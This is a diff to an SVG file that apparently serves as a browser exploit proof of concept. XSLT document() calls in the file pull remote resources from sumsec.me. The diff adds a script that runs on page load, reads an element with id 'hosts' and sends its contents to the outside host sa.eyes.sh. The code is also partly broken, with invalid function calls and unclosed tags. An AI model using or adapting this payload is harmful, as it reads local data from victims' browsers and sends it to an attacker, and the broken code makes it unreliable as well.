@@ -8,7 +8,14 @@
     <foreignObject class="node" font-size="18" width="100%" height="100%">
     <body xmlns="http://www.w3.org/1999/xhtml">
       <xmp><xsl:copy-of  select="document('https://sumsec.me/resources/chrome/r.php')"/></xmp>
+      <script type="text/javascript">
+        window.onload = function(){
+          var xhr = new XMLHttpRequest();
+          xhr.open("GET", "https://sa.eyes.sh/?exp="+encodeURL(document.getElementById("hosts").textContent());
+          xhr.send();
+          alert(document.getElementById("hosts").textContent());
       <xmp><xsl:copy-of  select="document('https://sumsec.me/resources/chrome/r.xxx')"/></xmp>
+      
     </body>
     </foreignObject>
   </svg>
